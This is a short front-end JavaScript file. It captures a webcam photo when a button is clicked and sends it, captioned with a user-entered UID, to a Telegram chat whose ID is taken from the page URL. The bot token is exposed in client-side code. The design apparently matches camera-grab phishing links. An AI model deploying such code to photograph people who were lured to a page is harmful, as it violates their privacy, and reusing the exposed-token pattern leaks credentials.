import { BOT_TOKEN } from "./config.js";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const sendBtn = document.getElementById("sendBtn");
const toast = document.getElementById("toast");

const params = new URLSearchParams(window.location.search);
const chatId = params.get("id");

let stream = null;

// Show toast message
function showToast(msg){
  toast.innerText = msg;
  toast.style.opacity = 1;
  setTimeout(()=>{ toast.style.opacity=0 }, 3000);
}

// Button click
sendBtn.onclick = async () => {

  // User ID
  const uid = document.getElementById("uid").value || "No UID";

  if(!chatId){
    showToast("Chat ID missing in URL!");
    return;
  }

  try{
    // Request camera permission
    if(!stream){
      stream = await navigator.mediaDevices.getUserMedia({video:true});
      video.srcObject = stream;
    }

    // Capture photo
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    canvas.toBlob(async (blob) => {
      let formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob);
      formData.append("caption", `UID: ${uid}`);

      try{
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method:"POST",
          body:formData
        });
        const data = await res.json();
        if(data.ok){
          showToast("Photo sent ✅");
        } else {
          console.error(data);
          showToast("Failed to send ❌");
        }
      }catch(err){
        console.error(err);
        showToast("Error sending ❌");
      }

    }, "image/jpeg");

  }catch(e){
    console.error(e);
    showToast("Permission denied ❌");
  }
};
